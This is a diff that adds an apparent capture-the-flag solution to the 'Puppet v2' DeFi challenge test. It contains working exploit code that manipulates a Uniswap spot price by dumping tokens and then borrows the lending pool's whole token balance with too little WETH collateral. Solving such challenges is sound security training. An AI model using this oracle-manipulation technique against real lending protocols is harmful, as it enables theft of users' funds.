@@ -83,6 +83,17 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        
+        // manipulate prices by adjusting liquidity
+        const deadline = (await ethers.provider.getBlock("latest")).timestamp * 2;
+        await uniswapRouter.connect(player).swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, [token.address, weth.address], player.address, deadline, { gasLimit: 1e6 });
+
+        const tokens = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await weth.connect(player).deposit({ value: tokens });
+        
+        await weth.connect(player).approve(lendingPool.address, tokens);
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
